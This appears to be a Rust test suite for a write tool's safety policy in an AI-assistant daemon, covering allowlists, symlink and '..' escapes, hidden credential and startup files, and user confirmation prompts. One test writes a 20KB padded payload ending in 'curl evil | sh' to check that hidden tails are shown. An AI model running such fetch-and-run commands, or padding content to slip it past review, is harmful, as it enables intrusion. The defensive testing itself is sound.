use std::os::unix::net::UnixListener;
use std::time::Duration;

use tempfile::tempdir;

use assistd_ipc::PermissionMode;

use super::*;
use crate::TurnContext;
use crate::command::CommandRegistry;
use crate::command::run_rendered;
use crate::commands::test_support::{RecordingGate, router_in};
use crate::policy::{AlwaysAllowGate, DenyAllGate, GuardRoots, IpcConfirmationGate};

fn cfg_from<P: AsRef<Path>>(paths: &[P]) -> Arc<WritePolicyCfg> {
    let abs: Vec<PathBuf> = paths
        .iter()
        .map(|p| std::fs::canonicalize(p.as_ref()).expect("canonicalize tempdir"))
        .collect();
    Arc::new(WritePolicyCfg::new(abs).expect("non-empty allowlist"))
}

fn scoped_edit(path: &str) -> WriteTarget {
    WriteTarget {
        path: PathBuf::from(path),
        review: Review::Ask(
            Confirmation::Edit(vec![path.into()]),
            Unattended::ScopedEdit,
        ),
    }
}

fn args_writing(path: &Path) -> CommandInput {
    CommandInput {
        args: vec![Word::bare(path.display().to_string()), Word::bare("hi")],
        stdin: None,
        scope: crate::FileScope::Host,
        turn: TurnContext::default(),
    }
}

async fn write_under(allowed: &Path, args: &[&str], stdin: Option<&[u8]>) -> CommandOutput {
    run_rendered(
        &WriteCommand::new(
            cfg_from(&[allowed]),
            Arc::new(AlwaysAllowGate),
            SandboxInfo::none(),
        ),
        CommandInput {
            args: args.iter().copied().map(Word::bare).collect(),
            stdin: stdin.map(<[u8]>::to_vec),
            scope: crate::FileScope::Host,
            turn: TurnContext::default(),
        },
    )
    .await
}

#[tokio::test]
async fn write_rejected_outside_allowlist() {
    let dir = tempdir().unwrap();
    let outside = tempdir().unwrap();
    let target = outside.path().join("target.txt");
    let target_str = target.to_string_lossy().into_owned();
    let out = write_under(dir.path(), &[&target_str, "oops"], None).await;
    assert_eq!(out.exit_code, 126);
    assert_eq!(
        String::from_utf8_lossy(&out.stderr),
        format!(
            "[error] write: {target_str}: path not in writable allowlist. \
             Check: [tools.write] writable_paths in config\n"
        )
    );
    assert!(!target.exists());
}

#[tokio::test]
async fn write_allowlist_resolves_dotdot() {
    let root = tempdir().unwrap();
    let allowed = root.path().join("allowed");
    std::fs::create_dir(&allowed).unwrap();
    let escaped = root.path().join("escaped.txt");
    let tricky = format!("{}/../escaped.txt", allowed.display());
    let out = write_under(&allowed, &[&tricky, "oops"], None).await;
    assert_eq!(out.exit_code, 126);
    assert_eq!(
        String::from_utf8_lossy(&out.stderr),
        format!(
            "[error] write: {tricky}: path not in writable allowlist. \
             Check: [tools.write] writable_paths in config\n"
        )
    );
    assert!(!escaped.exists());
}

#[tokio::test]
async fn write_allowlist_rejects_relative_path() {
    let dir = tempdir().unwrap();
    let out = write_under(dir.path(), &["relative.txt", "hi"], None).await;
    assert_eq!(out.exit_code, 126);
    assert_eq!(
        String::from_utf8_lossy(&out.stderr),
        "[error] write: relative.txt: relative paths not permitted. \
         Try: an absolute path under an allowlisted directory\n"
    );
}

#[test]
fn write_allowlist_expands_tilde() {
    let dir = tempdir().unwrap();
    let home = dir.path().to_str().expect("tempdir path is valid utf-8");
    let resolved = resolve_for_allowlist("~/tilde-target.txt", Some(home)).expect("tilde resolves");
    let expected = std::fs::canonicalize(dir.path())
        .expect("tempdir canonicalizes")
        .join("tilde-target.txt");
    assert_eq!(resolved, expected);
}

#[tokio::test]
async fn dangling_symlink_escaping_allowlist_is_rejected() {
    let allowed = tempdir().unwrap();
    let outside = tempdir().unwrap();
    let escape_target = outside.path().join("escaped.txt");
    let link = allowed.path().join("link");
    std::os::unix::fs::symlink(&escape_target, &link).unwrap();

    let out = write_under(allowed.path(), &[&link.to_string_lossy(), "oops"], None).await;
    assert_eq!(out.exit_code, 126, "{:?}", out.stderr);
    assert!(!escape_target.exists());
}

#[tokio::test]
async fn dangling_symlink_directory_escaping_allowlist_is_rejected() {
    let allowed = tempdir().unwrap();
    let outside = tempdir().unwrap();
    let missing = outside.path().join("missing");
    let link = allowed.path().join("dir");
    std::os::unix::fs::symlink(&missing, &link).unwrap();

    let target = link.join("file.txt");
    let out = write_under(allowed.path(), &[&target.to_string_lossy(), "oops"], None).await;
    assert_eq!(out.exit_code, 126, "{:?}", out.stderr);
    assert!(!missing.exists());
}

#[tokio::test]
async fn symlink_final_component_is_refused() {
    let dir = tempdir().unwrap();
    let real = dir.path().join("real.txt");
    std::fs::write(&real, b"old").unwrap();
    let link = dir.path().join("link");
    std::os::unix::fs::symlink(&real, &link).unwrap();

    let link_str = link.to_string_lossy().into_owned();
    let out = write_under(dir.path(), &[&link_str, "new"], None).await;
    assert_eq!(out.exit_code, POLICY_DENIED_EXIT);
    assert_eq!(
        String::from_utf8_lossy(&out.stderr),
        format!("[error] write: {link_str}: is a symlink. Try: writing to the file it points at\n")
    );
    assert_eq!(std::fs::read(&real).unwrap(), b"old");
}

#[tokio::test]
async fn symlinked_ancestor_inside_the_allowlist_writes_to_its_target() {
    let dir = tempdir().unwrap();
    let real_dir = dir.path().join("real");
    std::fs::create_dir(&real_dir).unwrap();
    let dir_link = dir.path().join("dir-link");
    std::os::unix::fs::symlink(&real_dir, &dir_link).unwrap();

    let target = dir_link.join("out.txt");
    let out = write_under(dir.path(), &[&target.to_string_lossy(), "hi"], None).await;
    assert_eq!(
        out.exit_code,
        0,
        "{:?}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert_eq!(std::fs::read(real_dir.join("out.txt")).unwrap(), b"hi");
}

#[test]
fn open_refuses_any_symlink_in_the_path() {
    let dir = tempdir().unwrap();
    let real_dir = dir.path().join("real");
    std::fs::create_dir(&real_dir).unwrap();
    let dir_link = dir.path().join("dir-link");
    std::os::unix::fs::symlink(&real_dir, &dir_link).unwrap();
    let file_link = dir.path().join("file-link");
    std::os::unix::fs::symlink(real_dir.join("target.txt"), &file_link).unwrap();

    for path in [dir_link.join("target.txt"), file_link] {
        open_without_symlinks(&path).expect_err("symlinks must not be followed");
    }
    assert!(!real_dir.join("target.txt").exists());
}

#[tokio::test]
async fn hidden_entries_at_any_depth_below_a_prefix_are_refused() {
    let dir = tempdir().unwrap();
    std::fs::create_dir(dir.path().join(".ssh")).unwrap();
    std::fs::create_dir_all(dir.path().join("repo").join(".git")).unwrap();
    for target in [
        dir.path().join(".bashrc"),
        dir.path().join(".ssh").join("authorized_keys"),
        dir.path()
            .join(".config")
            .join("autostart")
            .join("x.desktop"),
        dir.path().join("repo").join(".git").join("config"),
        dir.path().join("repo").join(".envrc"),
    ] {
        let target_str = target.to_string_lossy().into_owned();
        let out = write_under(dir.path(), &[&target_str, "oops"], None).await;
        assert_eq!(out.exit_code, POLICY_DENIED_EXIT, "{target_str}");
        assert_eq!(
            String::from_utf8_lossy(&out.stderr),
            format!(
                "[error] write: {target_str}: hidden files and directories are not writable. \
                 Try: asking the user to make this change themselves\n"
            )
        );
        assert!(!target.exists());
    }
}

#[tokio::test]
async fn hidden_directory_listed_as_a_prefix_is_writable() {
    let dir = tempdir().unwrap();
    let hidden = dir.path().join(".notes");
    std::fs::create_dir(&hidden).unwrap();
    let target = hidden.join("todo.txt");
    let out = run_rendered(
        &WriteCommand::new(
            cfg_from(&[dir.path(), hidden.as_path()]),
            Arc::new(AlwaysAllowGate),
            SandboxInfo::none(),
        ),
        CommandInput {
            args: vec![Word::bare(target.to_string_lossy()), Word::bare("hi")],
            stdin: None,
            scope: crate::FileScope::Host,
            turn: TurnContext::default(),
        },
    )
    .await;
    assert_eq!(
        out.exit_code,
        0,
        "{:?}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert_eq!(std::fs::read(&target).unwrap(), b"hi");
}

#[tokio::test]
async fn overwrites_and_truncates_existing_file() {
    let dir = tempdir().unwrap();
    let path = dir.path().join("out.txt");
    std::fs::write(&path, b"much longer old content").unwrap();

    let out = write_under(dir.path(), &[&path.to_string_lossy(), "new"], None).await;
    assert_eq!(out.exit_code, 0, "{:?}", out.stderr);
    assert_eq!(std::fs::read(&path).unwrap(), b"new");
}

#[tokio::test]
async fn globs_stay_literal_and_a_missing_content_never_truncates() {
    let dir = tempdir().unwrap();
    let dir_path = dir.path().display();
    for name in ["a.md", "b.md"] {
        std::fs::write(dir.path().join(name), b"keep").unwrap();
    }
    let mut registry = CommandRegistry::new();
    registry.register(WriteCommand::new(
        cfg_from(&[dir.path()]),
        Arc::new(AlwaysAllowGate),
        SandboxInfo::none(),
    ));
    let run = |line: String| {
        let registry = &registry;
        async move {
            crate::chain::execute(
                &crate::chain::parse_chain(&line).unwrap(),
                registry,
                &TurnContext::default(),
            )
            .await
        }
    };

    let out = run(format!("write {dir_path}/notes.txt use *.md here")).await;
    assert_eq!(out.exit_code, 0, "{:?}", out.stderr);
    assert_eq!(
        std::fs::read(dir.path().join("notes.txt")).unwrap(),
        b"use *.md here"
    );

    let out = run(format!("write {dir_path}/*.md hello")).await;
    assert_eq!(out.exit_code, 0, "{:?}", out.stderr);
    assert_eq!(std::fs::read(dir.path().join("*.md")).unwrap(), b"hello");
    let out = run(format!("write {dir_path}/a.md")).await;
    assert_ne!(out.exit_code, 0);
    for name in ["a.md", "b.md"] {
        assert_eq!(
            std::fs::read(dir.path().join(name)).unwrap(),
            b"keep",
            "{name}"
        );
    }
}

fn assert_not_regular_file_refusal(out: &CommandOutput, target: &str) {
    assert_eq!(out.exit_code, POLICY_DENIED_EXIT, "{target}");
    assert_eq!(
        String::from_utf8_lossy(&out.stderr),
        format!(
            "[error] write: {target}: not a regular file (device, pipe, or socket). \
             Try: a path to a regular file, or to one that does not exist yet\n"
        )
    );
}

#[tokio::test]
async fn fifo_without_a_reader_is_refused_without_blocking() {
    let dir = tempdir().unwrap();
    let fifo = dir.path().join("pipe");
    rustix::fs::mkfifoat(rustix::fs::CWD, &fifo, Mode::from_raw_mode(0o600)).unwrap();
    let target = fifo.to_string_lossy().into_owned();

    let out = tokio::time::timeout(
        Duration::from_secs(5),
        write_under(dir.path(), &[&target, "hi"], None),
    )
    .await
    .expect("writing to a FIFO must not block");
    assert_not_regular_file_refusal(&out, &target);
}

#[tokio::test]
async fn fifo_with_a_reader_is_refused() {
    let dir = tempdir().unwrap();
    let fifo = dir.path().join("pipe");
    rustix::fs::mkfifoat(rustix::fs::CWD, &fifo, Mode::from_raw_mode(0o600)).unwrap();
    let _reader =
        rustix::fs::open(&fifo, OFlags::RDONLY | OFlags::NONBLOCK, Mode::empty()).unwrap();
    let target = fifo.to_string_lossy().into_owned();

    let out = tokio::time::timeout(
        Duration::from_secs(5),
        write_under(dir.path(), &[&target, "hi"], None),
    )
    .await
    .expect("writing to a FIFO must not block");
    assert_not_regular_file_refusal(&out, &target);
}

#[tokio::test]
async fn sockets_and_devices_are_refused() {
    let dir = tempdir().unwrap();
    let socket = dir.path().join("sock");
    let _listener = UnixListener::bind(&socket).unwrap();
    for (allowed, target) in [
        (dir.path(), socket.as_path()),
        (Path::new("/dev"), Path::new("/dev/null")),
    ] {
        let target = target.to_string_lossy().into_owned();
        let out = write_under(allowed, &[&target, "hi"], None).await;
        assert_not_regular_file_refusal(&out, &target);
    }
}

#[tokio::test]
async fn refuses_a_protected_directory_inside_a_writable_one() {
    let dir = tempdir().unwrap();
    let config = dir.path().join("assistd");
    std::fs::create_dir(&config).unwrap();
    let canonical = std::fs::canonicalize(&config).unwrap();
    let cfg = WritePolicyCfg::new(vec![std::fs::canonicalize(dir.path()).unwrap()])
        .expect("non-empty allowlist")
        .protecting(vec![canonical]);
    let target = config.join("config.toml");
    let out = run_rendered(
        &WriteCommand::new(
            Arc::new(cfg),
            Arc::new(AlwaysAllowGate),
            SandboxInfo::none(),
        ),
        CommandInput {
            args: vec![Word::bare(target.to_string_lossy()), Word::bare("x")],
            stdin: None,
            scope: crate::FileScope::Host,
            turn: TurnContext::default(),
        },
    )
    .await;
    assert_eq!(out.exit_code, POLICY_DENIED_EXIT);
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("assistd's own configuration"),
        "{:?}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(!target.exists());
}

#[tokio::test]
async fn only_writes_under_the_shared_scratch_dir_are_not_confirmed() {
    let gate = RecordingGate::answering(Approval::Once);
    let sandbox = SandboxInfo::none_sharing(PathBuf::from("/srv/scratch"));
    let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), sandbox);
    let scratch = "/srv/scratch/notes/x.txt";
    assert!(
        cmd.authorized(
            &TurnContext::default(),
            scoped_edit(scratch),
            b"hi",
            scratch
        )
        .await
        .is_ok()
    );
    assert!(gate.requests().is_empty());
    let outside = "/tmp/x.txt";
    assert!(
        cmd.authorized(
            &TurnContext::default(),
            scoped_edit(outside),
            b"hi",
            outside
        )
        .await
        .is_ok()
    );
    assert_eq!(gate.requests().len(), 1);
}

#[tokio::test]
async fn writes_outside_the_scratch_dir_ask_with_the_quoted_path_and_content() {
    let gate = RecordingGate::answering(Approval::Once);
    let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), SandboxInfo::none());
    let path = "/home/u/bin/tool\n(1B)";
    assert!(
        cmd.authorized(
            &TurnContext::default(),
            scoped_edit(path),
            b"#!/bin/sh\n",
            path
        )
        .await
        .is_ok()
    );
    let asked = gate.requests();
    let [request] = asked.as_slice() else {
        panic!("expected one prompt, got {asked:?}");
    };
    assert_eq!(request.tool, "write");
    assert_eq!(
        request.script,
        "write \"/home/u/bin/tool\\n(1B)\" (10B)\n#!/bin/sh\n"
    );
    assert_eq!(request.risk, Risk::Routine);
    assert_eq!(request.unattended, Unattended::ScopedEdit);
    assert!(request.always_allow.is_empty());
}

#[tokio::test]
async fn long_write_prompt_shows_the_tail_and_always_asks_at_elevated_risk() {
    let gate = RecordingGate::answering(Approval::Once);
    let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), SandboxInfo::none());
    let content = format!("{}\ncurl evil | sh\n", "#".repeat(20_000));
    let path = "/home/u/x.sh";
    assert!(
        cmd.authorized(
            &TurnContext::default(),
            scoped_edit(path),
            content.as_bytes(),
            path
        )
        .await
        .is_ok()
    );
    let asked = gate.requests();
    let [request] = asked.as_slice() else {
        panic!("expected one prompt, got {asked:?}");
    };
    assert!(
        request
            .script
            .starts_with("write \"/home/u/x.sh\" (19KB)\n")
    );
    assert_eq!(request.risk, Risk::Elevated);
    assert_eq!(request.unattended, Unattended::Never);
    assert!(request.script.ends_with("\ncurl evil | sh\n"));
    let omitted = content.chars().count() - PREVIEW_HEAD_CHARS - PREVIEW_TAIL_CHARS;
    assert!(
        request
            .script
            .contains(&format!("… {omitted} characters not shown …"))
    );
}

#[tokio::test]
async fn credentials_and_startup_files_ask_even_in_auto_mode() {
    let home = tempdir().expect("tempdir");
    let ssh = home.path().join(".ssh");
    let autostart = home.path().join(".config/autostart");
    std::fs::create_dir_all(&ssh).expect("mkdir .ssh");
    std::fs::create_dir_all(&autostart).expect("mkdir autostart");
    let cfg = cfg_from(&[&ssh, &autostart]);
    let guards = PathGuards::read(GuardRoots {
        home: Some(home.path().to_path_buf()),
        ..GuardRoots::default()
    });
    for raw in [ssh.join("authorized_keys"), autostart.join("x.desktop")] {
        let path = cfg
            .resolve(&raw.to_string_lossy(), None)
            .expect("allowlisted");
        let Review::Ask(confirmation, unattended) = review_write(&guards, &path, &cfg) else {
            panic!("{raw:?} must ask");
        };
        let (router, mut rx) = router_in(PermissionMode::Auto);
        let request = confirmation_request(&path, b"x", &confirmation, unattended);
        assert_eq!(router.ask(request).await, Approval::Deny, "{raw:?}");
        assert!(rx.try_recv().is_ok(), "{raw:?} was not put to the user");
    }
}

#[tokio::test]
async fn a_fully_shown_write_in_the_edit_scope_asks_only_in_manual_mode() {
    let dir = tempdir().expect("tempdir");
    let cmd = WriteCommand::new(
        cfg_from(&[dir.path()]),
        Arc::new(IpcConfirmationGate),
        SandboxInfo::none(),
    );
    let target = dir.path().join("notes.txt");
    for (mode, asks) in [
        (PermissionMode::Manual, true),
        (PermissionMode::AcceptEdits, false),
        (PermissionMode::Auto, false),
    ] {
        let _ = std::fs::remove_file(&target);
        let (router, mut rx) = router_in(mode);
        let asking = CommandInput {
            turn: TurnContext::answered_by(router),
            ..args_writing(&target)
        };
        let out = run_rendered(&cmd, asking).await;
        assert_eq!(rx.try_recv().is_ok(), asks, "{mode:?}");
        assert_eq!(target.exists(), !asks, "{mode:?}: {out:?}");
    }
}

#[tokio::test]
async fn declined_write_outside_tmp_exits_126_without_writing() {
    let prefix = Path::new(env!("CARGO_MANIFEST_DIR"));
    let target = prefix.join(format!("declined-{}.txt", std::process::id()));
    let target_str = target.to_string_lossy().into_owned();
    let out = run_rendered(
        &WriteCommand::new(
            cfg_from(&[prefix]),
            Arc::new(DenyAllGate),
            SandboxInfo::none(),
        ),
        CommandInput {
            args: vec![Word::bare(target_str.as_str()), Word::bare("x")],
            stdin: None,
            scope: crate::FileScope::Host,
            turn: TurnContext::default(),
        },
    )
    .await;
    assert_eq!(out.exit_code, POLICY_DENIED_EXIT);
    assert_eq!(
        String::from_utf8_lossy(&out.stderr),
        format!(
            "[error] write: {target_str}: write cancelled by user. \
             Try: asking the user to make this change\n"
        )
    );
    assert!(!target.exists());
}
